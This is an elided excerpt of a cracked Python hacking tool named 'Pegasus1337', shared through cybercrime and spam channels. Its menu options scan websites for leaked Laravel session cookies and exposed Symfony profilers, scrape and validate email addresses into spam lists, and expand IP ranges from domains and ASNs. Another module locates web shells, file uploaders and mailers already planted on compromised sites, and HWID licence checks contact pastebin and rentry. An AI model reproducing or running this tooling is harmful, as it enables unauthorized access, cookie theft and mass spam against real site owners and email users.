...
if os.path.exists("Pegasus1337"): 

    pass

else: 

    os.mkdir("Pegasus1337") 
...
def hardwarecheck():
    ...
    hwlists = requests.get("https://rentry.co/cgqi4/raw").json()
   ...
   # try:
    ...
    if hwid not in hwlists: 
        ...
        vinfo( "{g}x", "Your hwid is not registered in violent system {y}( Auto Closed In 60 Seconds )" )

        vinfo( "{b}!", "If you done buy, send your HWID to Telegram {g}@Violent_Real" )

        input('Click Enter To Exit ')

        sys.exit()

    cdt = re.findall( "(.*?)-(.*?)-(.*?)T", requests.get("http://worldclockapi.com/api/json/est/now").json()["currentDateTime"])[0]
...
\033[1;39m     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
       ...
       {g}[{w}Channel : https://www.facebook.com/Darkkingcybercrime71/"{g}]{w}
       {g}[{w}Cracked BY BIBIL_0DAY : T.me/spamworldpro [ V I P ] {g}]{w}
       {g}[{w}Tool Posted On Vip Channel{g}]{w}
       {g}Tool Shared on (Forum - {g}https://spam-world.pro/
    ...
    if select == "1":
      ...
      #  except:
        ...
        for web in open(inputip).read().splitlines():
            ...
            try:
                ...
                if "Null" in r.text:
                    ...
                    open('Pegasus1337/exploit_cookies.txt', 'a').write(web + ' Cookies -> '+r.text + '')
            ...
            for webcek in inputlist.splitlines():
             ...
             #   try:
                ...
                if "authentication/login" in response.text: 
                    ...
                    open('Pegasus1337/bluemail-valid.txt', 'a').write(webcek + '\n')

                else: 

                    print(f"|{webcek}| -> |{Fore.RED}Not BlueMail{Style.RESET_ALL}|")

                    open('Pegasus1337/not-bluemail.txt', 'a').write(webcek + '\n')
            ...
            try:
                ...
                if "symfony/profiler/" in response.text or "symfony" in response.text: 
                    ...
                    if "symfony/profiler/" in response2.text or "symfony" in response2.text: 
                        ...
                        open('Pegasus1337/unknown-live.txt', 'a').write(webcek + '\n')
            ...
            try:
                ...
                for email in get_emails(file_to_str()):
                    ...
                    if 'gmail' in email:
                        ...
                        f =open('/Pegasus1337/gmail-file.txt', 'a')
                        ...
                        f = open('/Pegasus1337/yahoo-file.txt', 'a')
                        ...
                        f = open('/Pegasus1337/hotmail-file.txt', 'a')
                        ...
                        f = open('/Pegasus1337/random.txt', 'a')
                ...
                for website in arrayweb:
                    ...
                    for result in s.find_all('font'):
                        ...
                        if findall('([A-Za-z0-9]\\.co.uk)', result):
                            ...
                            open('Pegasus1337/result-uk-frompage.txt', 'a').write(result+"\n")
        ...
        def domtoip(filewebs3):
            ...
            try:
                ...
                open('Pegasus1337/domain-to-ips.txt', 'a').write(hostn + '\n')
                    ...
                    if response.status_code == 200:
                        ...
                        if "laravel_session" in response.cookies: 
                            ...
                            if webcek not in tempatsampah:
                                ...
                                open('Pegasus1337/live-ips.txt', 'a').write(webcek + '\n')
        ...
        try:
            ...
            if '404 Not Found' in r:
                ...
                open( "Pegasus1337/" + negara + ".txt", "a" ).write( r4 + "\n" )
            ...
            print(f"Already Saved In Pegasus1337/{negara}.txt")
        ...
        inputlist = open("Pegasus1337/" + negara + ".txt", 'r').read().split('\n')    
        ...
        def domtoip(filewebs3):
            ...
            try:
                ...
                open('Pegasus1337/domain-to-ips-option-11.txt', 'a').write(hostn + '\n')
        ...
        if filewebs3:
          ...
          #  try:
            ...
            with ThreadPoolExecutor(int(threaddom)) as zz:
                ...
                for ip in open('Pegasus1337/domain-to-ips-option-11.txt').read().splitlines():
               ...
               #     try:
                    ...
                    for result in range(0, 251):
                        ...
                        open('Pegasus1337/ranged-ender-option-11.txt', 'a').write(resultx + '\n')
                    ...
                    for result in range(0, 251):
                        ...
                        open('Pegasus1337/ranged-middle-option-11.txt', 'a').write(resultq + '\n')

                        print(f"{Fore.BLUE}[SUCCCES]{Style.RESET_ALL} | {resultq} | {Fore.GREEN}[ Ranged IP Middle ]{Style.RESET_ALL}")

                        open('Pegasus1337/ranged-all-option-11.txt', 'a').write(resultx + '\n' + resultq +'\n')
      ...
      #  if sites:
        ...
        def grab2(tanggal,data):
            ...
            if data in open(f"Pegasus1337/{tanggal}.txt").read().splitlines():

                return

            open(f"Pegasus1337/{tanggal}.txt","a+").write(f"{data}\n")
        ...
        def grab3(tanggal,lastpage,y,m,d):
            ...
            print('\n[#] Success > {} domain'.format(sum(1 for line in open(f'Pegasus1337/{tanggal}.txt', 'r'))))
        ...
        if not os.path.exists("Pegasus1337"):

            os.makedirs("Pegasus1337")

        if not os.path.exists(f"Pegasus1337/{tanggal}.txt"):

            open(f"Pegasus1337/{tanggal}.txt","w").write("")
          ...
          #  try:
            ...
            for Yh in range(0, int(len(rather)) - 1):
                ...
                for IP in IPL:  
                    ...
                    open('Pegasus1337/UNCHECKED_ASN_IPS.txt', 'a', errors='ignore', encoding='utf-8').write(f"{IP}\n")
            ...
            for mail in mails: 
                ...
                if mail not in tmp:
                    ...
                    if is_email( mail, check_dns=True):
                        ...
                        open('Pegasus1337/mailist-vlistexv3.txt', 'a').write( mail+'\n' )
                ...
                for script in listaa:
                    ...
                    while True:
                        ...
                        if 'drwxr-xr-x' in req_first.text or '-rw-r--r--' in req_first.text or 'drwxr-x---' in req_first.text:
                            ...
                            with open('Pegasus1337/shell.txt', 'a') as (file):
                            ...
                            with open('Pegasus1337/uploader-shell.txt', 'a') as (gn):
                            ...
                            with open('Pegasus1337/shell.txt', 'a') as (fox):
                            ...
                            with open('Pegasus1337/mailer.txt', 'a') as (mailers):
                            ...
                            if 'method=post>Password:' in req_first.text or '<input type=password name=pass' in req_first.text:
                                ...
                                with open('Pegasus1337/user-pass.txt', 'a') as (pa):
                                ...
                                if 'name="uploader" id="uploader">' in req_first.text:
                                    ...
                                    with open('Pegasus1337/vuln-uploader.txt', 'a') as (fo):
...
def check():
  ...
  {gr}  ____    _    ____  _  __  _  _____ _   _  ____  
  {gr} |  _ \  / \  |  _ \| |/ / | |/ /_ _| \ | |/ ___| 
  {gr} | | | |/ _ \ | |_) | ' /  | ' / | ||  \| | |  _  
  {wh} | |_| / ___ \|  _ <| . \  | . \ | || |\  | |_| | 
  {wh} |____/_/   \_\_| \_\_|\_\ |_|\_\___|_| \_|\____| 
                                                  

       {gr}[{wh}Channel : Bangladesh-cyber404{gr}]{wh}

       {gr}[{wh}Tool Posted On Vip Channel{gr}]{wh}

       {gr}Cracked By @BIBIL_0DAY - T.me/spamworldsecurity{gr}


   {wh}- {gr}- {wh}- {gr}- {wh}- {gr}- {wh}- {gr}- {wh}- {gr}- {wh}- {gr}- {wh}- {gr}- {wh}- {gr}- {wh}- {gr}- {wh}- {gr}- {wh}- {gr}- {wh}- {gr}- {wh}- {gr}- {wh}- {gr}- 

   """)

    hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()

    r = requests.get('https://pastebin.com/SnHmUeM1') # Paste your URL  e.g(https://pastebin.com)

    if hwid in r.text:

        print(f"{F.LIGHTCYAN_EX}[>] Connecting To Database{F.RESET}")
        
        time.sleep(1)

        print(f"{F.LIGHTCYAN_EX}[>] CRACKED BY BIBIL_0DAY")
